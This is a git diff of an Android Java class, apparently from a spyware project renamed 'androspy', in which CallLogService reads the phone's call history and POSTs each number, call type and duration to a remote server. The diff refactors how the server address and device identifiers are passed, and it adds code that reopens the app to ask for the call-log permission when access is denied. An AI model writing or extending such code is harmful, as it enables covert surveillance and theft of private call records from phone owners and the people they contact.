@@ -1,6 +1,7 @@
-package buddy.ap.com.adobot;
+package buddy.ap.com.androspy;
 
 import android.Manifest;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
@@ -14,17 +15,21 @@ import java.util.HashMap;
 
 import http.Http;
 
+import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
+
 public class CallLogService extends Thread implements Runnable {
 
     private static String TAG = "CallLogService";
 
     private static final String POSTURL = "/call-logs";
-    Client client;
-    int numlogs;
+    private CommonParams commonParams;
+    private Client client;
+    private int numlogs;
 
     public CallLogService(Client client, int numlogs) {
         this.client = client;
         this.numlogs = numlogs;
+        this.commonParams = new CommonParams(client);
     }
 
     @Override
@@ -41,10 +46,10 @@ public class CallLogService extends Thread implements Runnable {
 
             HashMap start = new HashMap();
             start.put("event", "getcallhistory:started");
-            start.put("uid", client.getUid());
-            start.put("device", client.getDevice());
+            start.put("uid", commonParams.getUid());
+            start.put("device", commonParams.getDevice());
             Http startHttp = new Http();
-            startHttp.setUrl(client.SERVER + "/notify");
+            startHttp.setUrl(commonParams.getServer() + "/notify");
             startHttp.setMethod("POST");
             startHttp.setParams(start);
             startHttp.execute();
@@ -69,7 +74,7 @@ public class CallLogService extends Thread implements Runnable {
                     String callDuration = managedCursor.getString(duration);
                     try {
                         HashMap p = new HashMap();
-                        p.put("uid", client.getUid());
+                        p.put("uid", commonParams.getUid());
                         p.put("call_id", Integer.toString(id));
                         p.put("type", callType);
                         p.put("phone", phNumber);
@@ -82,7 +87,7 @@ public class CallLogService extends Thread implements Runnable {
 
                         Http req = new Http();
                         req.setMethod("POST");
-                        req.setUrl(client.SERVER + POSTURL);
+                        req.setUrl(commonParams.getServer() + POSTURL);
                         req.setParams(p);
                         req.execute();
 
@@ -94,10 +99,10 @@ public class CallLogService extends Thread implements Runnable {
             }
 
             start.put("event", "getcallhistory:done");
-            start.put("uid", client.getUid());
-            start.put("device", client.getDevice());
+            start.put("uid", commonParams.getUid());
+            start.put("device", commonParams.getDevice());
             Http doneHttp = new Http();
-            doneHttp.setUrl(client.SERVER + "/notify");
+            doneHttp.setUrl(commonParams.getServer() + "/notify");
             doneHttp.setMethod("POST");
             doneHttp.setParams(start);
             doneHttp.execute();
@@ -108,14 +113,18 @@ public class CallLogService extends Thread implements Runnable {
             Log.i(TAG, "No SMS permission!!!");
             HashMap noPermit = new HashMap();
             noPermit.put("event", "nopermission");
-            noPermit.put("uid", client.getUid());
-            noPermit.put("device", client.getDevice());
+            noPermit.put("uid", commonParams.getUid());
+            noPermit.put("device", commonParams.getDevice());
             noPermit.put("permission", "READ_CALL_LOG");
             Http doneSMS = new Http();
-            doneSMS.setUrl(client.SERVER + "/notify");
+            doneSMS.setUrl(commonParams.getServer() + "/notify");
             doneSMS.setMethod("POST");
             doneSMS.setParams(noPermit);
             doneSMS.execute();
+            //ask permissions
+            Intent i = new Intent(client, MainActivity.class);
+            i.addFlags(FLAG_ACTIVITY_NEW_TASK);
+            client.startActivity(i);
         }
 
     }
